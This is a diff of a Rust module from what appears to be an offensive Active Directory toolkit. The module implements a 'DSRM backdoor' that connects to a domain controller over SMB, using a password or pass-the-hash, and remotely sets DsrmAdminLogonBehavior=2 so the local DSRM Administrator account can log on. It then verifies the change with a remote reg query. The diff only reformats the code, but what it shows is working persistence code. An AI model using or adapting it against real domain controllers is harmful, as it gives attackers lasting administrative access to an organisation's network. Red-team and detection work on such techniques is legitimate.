@@ -1,4 +1,4 @@
-﻿//! DSRM (Directory Services Restore Mode) backdoor.
+//! DSRM (Directory Services Restore Mode) backdoor.
 //!
 //! Sets `DsrmAdminLogonBehavior=2` on the DC's registry via a remote
 //! service, allowing the local DSRM Administrator account to authenticate
@@ -54,24 +54,28 @@ pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
     // ── Step 1: Connect to DC via SMB ───────────────────────────
     info!("[dsrm] Connecting to {} via SMB", config.dc_ip);
     let smb = if use_password {
-        SmbSession::connect(&config.dc_ip, &config.domain, &config.username, &password_or_hash)
-            .await
-            .map_err(|e| {
-                OverthroneError::TicketForge(format!(
-                    "SMB connect to {} failed: {e}",
-                    config.dc_ip
-                ))
-            })?
+        SmbSession::connect(
+            &config.dc_ip,
+            &config.domain,
+            &config.username,
+            &password_or_hash,
+        )
+        .await
+        .map_err(|e| {
+            OverthroneError::TicketForge(format!("SMB connect to {} failed: {e}", config.dc_ip))
+        })?
     } else {
         info!("[dsrm] Using pass-the-hash authentication");
-        SmbSession::connect_with_hash(&config.dc_ip, &config.domain, &config.username, &password_or_hash)
-            .await
-            .map_err(|e| {
-                OverthroneError::TicketForge(format!(
-                    "SMB PTH connect to {} failed: {e}",
-                    config.dc_ip
-                ))
-            })?
+        SmbSession::connect_with_hash(
+            &config.dc_ip,
+            &config.domain,
+            &config.username,
+            &password_or_hash,
+        )
+        .await
+        .map_err(|e| {
+            OverthroneError::TicketForge(format!("SMB PTH connect to {} failed: {e}", config.dc_ip))
+        })?
     };
 
     // ── Step 2: Verify admin access ─────────────────────────────
@@ -119,10 +123,7 @@ pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
     }
 
     // ── Step 4: Verify the value was set ────────────────────────
-    let verify_cmd = format!(
-        "reg query \"{}\" /v {}",
-        DSRM_REG_PATH, DSRM_REG_VALUE
-    );
+    let verify_cmd = format!("reg query \"{}\" /v {}", DSRM_REG_PATH, DSRM_REG_VALUE);
     info!("[dsrm] Verifying: {}", verify_cmd);
 
     let verify_output = exec_util::run_remote_command(&smb, &verify_cmd)
